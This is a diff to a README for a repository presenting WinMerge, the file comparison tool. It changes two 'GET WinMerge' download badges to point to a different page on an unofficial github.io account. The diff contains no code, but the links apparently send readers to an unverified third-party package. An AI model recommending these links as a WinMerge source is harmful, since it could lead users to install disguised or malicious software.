@@ -8,7 +8,7 @@ Use WinMerge to compare text files, inspect folder contents, review source code 
 
 ![WinMerge Banner](https://arere-se.com/wp-content/uploads/2022/09/WinMerge_logo.png)
 
-[![GET WinMerge](https://img.shields.io/badge/GET-WinMerge-0078D6?style=for-the-badge&logoColor=white)](https://xarannaolinalis.github.io/.github/WinMerge-File-Comparison-Tools)
+[![GET WinMerge](https://img.shields.io/badge/GET-WinMerge-0078D6?style=for-the-badge&logoColor=white)](https://xarannaolinalis.github.io/.github/WinMerge-2026)
 
 ## File and Folder Comparison Features
 
@@ -39,7 +39,7 @@ Compare directory contents to identify added, removed, and modified files. The f
 
 Use the button below to access the WinMerge package associated with this repository.
 
-[![GET WinMerge](https://img.shields.io/badge/GET-WinMerge-0078D6?style=for-the-badge&logoColor=white)](https://xarannaolinalis.github.io/.github/WinMerge-File-Comparison-Tools)
+[![GET WinMerge](https://img.shields.io/badge/GET-WinMerge-0078D6?style=for-the-badge&logoColor=white)](https://xarannaolinalis.github.io/.github/WinMerge-2026)
 
 ## Typical Workflow
 
